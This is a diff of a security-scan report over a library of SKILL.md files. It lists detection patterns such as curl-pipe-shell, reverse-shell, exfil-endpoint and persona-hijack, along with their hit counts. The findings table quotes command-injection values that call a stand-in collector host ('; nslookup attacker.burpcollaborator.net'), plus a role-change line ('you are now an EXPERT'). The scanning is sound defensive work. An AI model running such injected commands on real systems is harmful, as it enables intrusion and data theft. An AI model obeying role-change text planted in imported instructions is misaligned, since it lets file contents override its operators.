@@ -12,13 +12,13 @@ rewritten: backlog task 17 asks for a report only, and the library stays byte-id
 |---|---|
 | tree | `library/github-skills` |
 | scope | `instructions` (`SKILL.md` only) |
-| files scanned | 3,014 |
-| bytes scanned | 32,549,229 |
+| files scanned | 2,949 |
+| bytes scanned | 31,781,837 |
 | binary files skipped | 0 |
 | unreadable files | 0 |
 | patterns applied | 10 |
-| findings | 168 |
-| skills with at least one finding | 81 |
+| findings | 167 |
+| skills with at least one finding | 80 |
 
 ## Findings by pattern
 
@@ -29,7 +29,7 @@ rewritten: backlog task 17 asks for a report only, and the library stays byte-id
 | `curl-pipe-shell` | high | downloads a remote script and executes it | 9 | 9 |
 | `base64-decode-exec` | high | decodes a hidden payload before executing it | 1 | 1 |
 | `reverse-shell` | high | opens an outbound shell | 4 | 2 |
-| `exfil-endpoint` | high | sends data to a request-collection endpoint | 14 | 8 |
+| `exfil-endpoint` | high | sends data to a request-collection endpoint | 13 | 7 |
 | `credential-path` | medium | reads or points at stored credentials | 119 | 52 |
 | `privilege-escalation` | medium | runs a mutating command as root | 19 | 17 |
 | `install-hook` | medium | package lifecycle hook, runs automatically on install | 0 | 0 |
@@ -63,7 +63,6 @@ a `curl … | sudo bash` inside an Azure CLI install guide is documentation, not
 | high | `exfil-endpoint` | `security-arsenal` | `security-arsenal/SKILL.md` | 371 | `; nslookup attacker.burpcollaborator.net` |
 | high | `exfil-endpoint` | `security-arsenal` | `security-arsenal/SKILL.md` | 372 | `$(nslookup attacker.burpcollaborator.net)` |
 | high | `exfil-endpoint` | `security-arsenal` | `security-arsenal/SKILL.md` | 373 | ``ping -c 1 attacker.burpcollaborator.net`` |
-| high | `exfil-endpoint` | `shopify-expert` | `shopify-expert/SKILL.md` | 122 | `shopify app dev # Local dev with ngrok tunnel` |
 | high | `exfil-endpoint` | `whatsapp-cloud-api` | `whatsapp-cloud-api/SKILL.md` | 292 | `- Dev: use ngrok para teste local` |
 | high | `exfil-endpoint` | `whatsapp-cloud-api` | `whatsapp-cloud-api/SKILL.md` | 430 | `\| Webhook nao recebe \| URL invalida ou sem HTTPS \| Usar ngrok (dev) ou certificado SSL (prod) \|` |
 | high | `persona-hijack` | `last30days` | `last30days/SKILL.md` | 387 | `**CRITICAL: After research is complete, you are now an EXPERT on this topic.**` |
@@ -213,7 +212,7 @@ a `curl … | sudo bash` inside an Azure CLI install guide is documentation, not
 
 ## Distinct lines behind the findings
 
-168 findings collapse to 109 distinct (pattern, line) pairs.
+167 findings collapse to 108 distinct (pattern, line) pairs.
 8 of those pairs repeat across skills; the table lists the most repeated ones,
 so reading it reviews most of the queue. Fix or accept a line once, and every skill carrying
 it is decided.
@@ -233,7 +232,7 @@ it is decided.
 
 - Prompt-override and persona-hijack hits: **1**. These are the patterns that turn an
   imported instruction into an instruction to the model itself, so they are the first thing to read.
-- High-severity hits in total: **29** (`curl … | sh`, decoded payloads, reverse shells,
+- High-severity hits in total: **28** (`curl … | sh`, decoded payloads, reverse shells,
   collection endpoints). They are commands a skill tells its *user* to run, which is normal for
   installer-style skills; the risk is running them without reading, not their presence here.
 - Skills are only routed when they match a request, and skills marked `incomplete` are excluded from
